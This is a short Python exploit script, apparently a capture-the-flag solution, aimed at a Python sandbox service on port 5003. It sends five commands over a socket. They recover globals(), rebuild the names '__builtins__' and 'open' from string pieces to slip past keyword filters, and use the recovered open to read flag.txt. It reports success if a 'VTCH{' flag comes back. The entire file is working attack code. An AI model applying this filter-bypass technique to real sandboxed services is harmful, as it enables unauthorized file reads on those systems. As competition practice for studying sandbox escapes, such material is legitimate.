#!/usr/bin/env python3
import socket
import time
import sys

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = 5003
    
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Read greeting
    time.sleep(0.1)
    print(s.recv(1024).decode())
    
    # Send Command 1: Get globals
    cmd1 = "g=globals()\n"
    print(f"[*] Sending Command 1: {cmd1.strip()}")
    s.sendall(cmd1.encode())
    time.sleep(0.1)
    s.recv(1024)

    # Send Command 2: Reconstruct '__builtins__' string
    cmd2 = "b='__built'+'ins__'\n"
    print(f"[*] Sending Command 2: {cmd2.strip()}")
    s.sendall(cmd2.encode())
    time.sleep(0.1)
    s.recv(1024)

    # Send Command 3: Reconstruct 'open' string
    cmd3 = "o='op'+'en'\n"
    print(f"[*] Sending Command 3: {cmd3.strip()}")
    s.sendall(cmd3.encode())
    time.sleep(0.1)
    s.recv(1024)

    # Send Command 4: Extract open function
    cmd4 = "f=g[b][o]\n"
    print(f"[*] Sending Command 4: {cmd4.strip()}")
    s.sendall(cmd4.encode())
    time.sleep(0.1)
    s.recv(1024)

    # Send Command 5: Read and print the flag
    cmd5 = "print(f('flag.txt').read())\n"
    print(f"[*] Sending Command 5: {cmd5.strip()}")
    s.sendall(cmd5.encode())
    time.sleep(0.1)
    response = s.recv(1024).decode()
    print(response)
    
    if "VTCH{" in response:
        print("[+] Exploit SUCCESSFUL!")
    else:
        print("[-] Exploit FAILED!")
        
    s.close()

if __name__ == "__main__":
    main()
